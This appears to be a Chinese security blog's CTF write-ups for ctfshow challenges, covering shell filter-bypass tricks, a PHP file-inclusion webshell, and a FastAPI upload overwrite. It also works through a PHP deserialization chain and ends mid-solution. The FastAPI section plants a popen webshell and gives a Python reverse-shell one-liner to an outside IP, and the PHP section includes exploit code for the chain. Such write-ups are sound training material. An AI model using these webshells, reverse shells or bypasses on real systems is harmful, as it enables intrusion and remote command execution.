<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo Y2F0IGZsYWcucGhw | base64 -d | bash(sh)      </span><br><span class="line">//base64编码绕过  管道符(|)会把前一个命令的输出作为后一个命令的参数</span><br><span class="line">echo 63617420666c61672e706870 | xxd -r -p | bash(sh)         </span><br><span class="line">// hex编码绕过，原理同上</span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>checklist</title>
    <url>/2024/06/30/checklist/</url>
    <content><![CDATA[<h1 id="信息收集-找到站"><a href="#信息收集-找到站" class="headerlink" title="信息收集(找到站)"></a>信息收集(找到站)</h1><p>1.目录扫描<br>2.web框架识别<br>3.</p>
]]></content>
      <categories>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow 元旦杯刷题</title>
    <url>/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h1 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题目其实并不算难,只是有一个小点不知道导致一开始就卡住了.<br>这个点就是利用<code>file://localhost/etc/passwd</code>可以像上面那样包含文件。<br>而后的方法就很多了<br>我一开始像到的是利用session进度上传来上传一个webshell然后进行文件包含。也就是这题的法一</p>
<h2 id="法一session上传进度-文件包含-getshell"><a href="#法一session上传进度-文件包含-getshell" class="headerlink" title="法一session上传进度+文件包含=getshell"></a>法一session上传进度+文件包含=getshell</h2><p>我在之前学session反序列化时有学过session上传进度，这是当开启了session.upload_progress.enabled时我们POST一个与session.upload_progress.enabled同名的变量时上传进度可以在<code>$_SSESION</code>中获得即被保存为了session文件。那么我们就可以根据这个性质来进行条件进争。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://f959da0c-43a6-4b79-83b9-ac0a1b6d43d6.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>session文件的名字就是sess_PHPSESSID<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/2.png" class="" title="alt text"><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/1.png" class="" title="alt text"><br>可以发现成功getshell</p>
<h2 id="法二-利用docker裸文件上传-加文件包含-getshell"><a href="#法二-利用docker裸文件上传-加文件包含-getshell" class="headerlink" title="法二 利用docker裸文件上传 加文件包含 getshell"></a>法二 利用docker裸文件上传 加文件包含 getshell</h2><p>这个docker裸文件上传其实我很早之前就开了一篇博客想要学习但一直没学，现在填一下坑<a href="https://lisien11.github.io/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/">docker php裸文件上传</a></p>
<p>利用方法写在了上述文章里<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/3.png" class="" title="alt text"><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/4.png" class="" title="alt text"></p>
<h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/5.png" class="" title="alt text">
<img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/6.png" class="" title="alt text">
<h1 id="download"><a href="#download" class="headerlink" title="download"></a>download</h1>

<h1 id="easy-api"><a href="#easy-api" class="headerlink" title="easy_api"></a>easy_api</h1><p>打开openapi.json可以看到api<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/17.png" class="" title="alt text"><br>我们会发现文件上传，文件查看。和list查看文件<br>但是在我们上传文件名开头为/会发现查看list显示成功上传，但是无法使用uloads来查看会显示查找不到文件，那么我们猜测其上传后的路径并不会更改，但无法上传到根目录，但是uploads仍然会原路返回的寻找该路径文件。那么我们上传一个文件名为/etc/passwd的不久可以读取文件内容了吗?<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/24.png" class="" title="alt text"><br>经过尝试会发现成功读取到etcpasswd的部分内容</p>
<p>经过读取环境变量和cmdline知道其运行目录为<code>ctfshowsecretdir</code>,脚本名为ctfshow2024secret.py<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://f7d1a2a2-7256-4615-a8ad-135ffcde7a9b.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">path</span>):</span><br><span class="line">    r = requests.post(url+<span class="string">&#x27;upload/&#x27;</span>, files=&#123;<span class="string">&quot;file&quot;</span>:(path,<span class="string">&quot;LSE&quot;</span>)&#125;,verify=<span class="literal">False</span>)</span><br><span class="line">    filename = re.search(<span class="string">r&#x27;&quot;fileName&quot;:&quot;(.+)&quot;&#x27;</span>, <span class="built_in">str</span>(r.text)).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uploads</span>(<span class="params">fileName</span>):</span><br><span class="line">    r = requests.get(url+<span class="string">&quot;uploads/&quot;</span>+fileName, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    path=<span class="string">&quot;/proc/&quot;</span>+<span class="built_in">str</span>(pid)+<span class="string">&quot;/environ&quot;</span></span><br><span class="line">    <span class="comment">#path=&#x27;/ctfshowsecretdir/ctfshow2024secret.py&#x27;</span></span><br><span class="line">    filename=upload(path)</span><br><span class="line">    uploads(filename)</span><br></pre></td></tr></table></figure><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/25.png" class="" title="alt text"></p>
<img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/26.png" class="" title="alt text">
<p>在我们尝试来查看源码时会发现web直接崩了,即我们上传的文件直接将后端的ctfshow2024secret.py给覆盖了,既然是这样我们就可以尝试上传马来进行rec<br>因为这个是fastapi加uvicorn形式的源码所以我们要写一个api马来进行覆盖<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uvicorn,os</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> *</span><br><span class="line">&#123;app&#125; = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@&#123;app&#125;.get(<span class="params"><span class="string">&quot;/s&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">c</span>):</span><br><span class="line">  os.popen(c)</span><br></pre></td></tr></table></figure><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/27.png" class=""></p>
<img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/28.png" class="" title="alt text">
<p>由于上传上线是100个字符所以我们只能上传这个无法回显的小马，但是我们可以反弹shell。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s?c=python%20-c%20&#x27;import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22111.xxx.xxx.xxx%22%2C7777))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)&#x27;</span><br></pre></td></tr></table></figure></p>
<p>也可以尝试先上传如下代码到/ctfshowsecretdir/k.py<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uvicorn,os</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> *</span><br><span class="line">app = FastAPI()</span><br></pre></td></tr></table></figure><br>在上传如下文件到/ctfshowsecretdir/ctfshow2024secret.py<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> k <span class="keyword">import</span> *</span><br><span class="line">app = FastAPI()</span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/s&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">c</span>):</span><br><span class="line">    r=os.popen(c).read()</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure><br>将导入各个库的代码缩减成了导入k这导致了正好可以多加一个read函数和return结果使得可以回显<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/29.png" class="" title="alt text"><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/30.png" class="" title="alt text"></p>
<h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h1><p>这题是应该php反序列化，该题用到了不少的tirck，算是回忆了一下吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Chu0</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;waf1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show/i&#x27;</span>, <span class="variable">$Chu0</span>))</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;waf2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_in_waf_php</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$a</span>,<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hinthinthint,base64喔&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;fastfast&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0 = <span class="string">&#x27;xiuxiuxiu&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;绕一下吧孩子&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;开胃小菜，就让我成为签到题叭&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;WAF,启动！&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;被waf啦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先自然是分析链子了，这个比较简单过程就是<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf::__destruct-&gt;show::call-&gt;Chu0_write::__tostrinf</span><br></pre></td></tr></table></figure><br>之后就是绕waf了<br>首先waf我们会发现其传的参数是<code>$_REQUEST</code>这个传参但get和post传同一参数只会接受POST的所以我们在POST传个同一参数为1即可。<br>然后是waf2<br>因为参数是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>即GET传参?后的值<br>那么只要url编码后即可。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>上面那个waf可以使用C头来绕过，而且C头可以绕过__weakup exp代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h1=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h2=<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="keyword">new</span> <span class="title class_">Chu0_write</span>()));</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">#unserialize($c);</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">           <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">           <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">               <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;绕一下吧孩子&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">               <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">               <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后就是利用__tostring方法了<br>我们首先看到了一个文件写入和读取。<br>读取的了ctfw.txt并将内容拼接到了命令执行中<br>我的想法是写入urldecode这样就可以将其变为<code>eval($_GET[&#39;cmd&#39;])</code>然后再使用无字母数字命令执行就可以了</p>
<p>而要想写入urldecode就需要将前面的垃圾字符消除不然会报错</p>
<h2 id="base64消除垃圾字符"><a href="#base64消除垃圾字符" class="headerlink" title="base64消除垃圾字符"></a>base64消除垃圾字符</h2><p>我在写这题时第一时间想到了使用base64-decode这个过滤器来进行消除。但是我发现这个在多次解码后会影响原编码字符<br>于是我查看了wp<br>wp里写了消除的方法，就是在前面加一个AV@的base64编码，因为AV@在解码后是非码表字符这样就可以保障不会影响我们要写入的字符如下<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/31.png" class="" title="alt text"></p>
<p>但是这题限定了只能使用一次base64解码，那么我们就只能使用其他编码方法来一次就消除字符</p>
